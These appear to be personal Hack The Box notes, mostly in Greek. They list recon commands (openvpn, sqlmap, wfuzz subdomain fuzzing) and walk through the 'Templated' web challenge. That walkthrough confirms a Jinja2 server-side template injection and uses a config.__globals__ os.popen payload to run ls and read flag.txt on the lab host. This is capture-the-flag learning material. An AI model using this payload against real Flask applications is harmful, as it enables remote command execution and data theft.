useful :
sudo openvpn Desktop/security/lab_CodeBane.ovpn
sqlmap -r file.req -> μεσα στο file βαζω το burp request
sudo nano /etc/hosts
python3 SubDomainizer/SubDomainizer.py -u [htb website]
sudo wfuzz -w subdomains-top1million-110000.txt -u [full_website_name] --hc 301 -v -c -H "Host:FUZZ.[website].htb"(find subdomains in xyz.something.htb format





WEB CHALLENGES

*****TEMPLATED*****

Eλεγχουμε τον docker host (159.65.19.122:30244)
Μπαινοντας στην σελιδα, βλεπουμε "Proudly powered by Flask/Jinja2"
Αυτό μας προδιαθέτει οτι ισως εχουμε να κανουμε με template attack (SSTI - Server Side Template Injection)
Μπορουμε να δοκιμασουμε το εξης : http://159.65.19.122:30244/blah{{7*7}}. Η σελιδα φορτωνει εχοντας εκτελεσει την πραξη. Αυτο μας βεβαιωνει οτι εχουμε να κανουμε με jinja2, κατι που ηδη ξεραμε.
Ψαχνουμε στο ιντερνετ να δουμε για jinja2 payloads.
Μπαινοντας στο https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md  εχουμε ολα τα payloads που χρειαζομαστε. Μερικα λειτουργουν, αλλα οχι.
Το πιο ενδιαφερον ειναι το εξης : http://159.65.19.122:30244/blah{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
το οποιο ουσιαστικα εκτελει την εντολη ls στον docker host.
Αναμεσα στους φακελους, βλεπουμε και το flag.txt
Αρα, αν αλλαξουμε την εντολη σε : http://159.65.19.122:30244/blah{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
θα ανοιξει το αρχειο flag.txt και μολις φορτωσει η σελιδα θα εχουμε την σημαια.
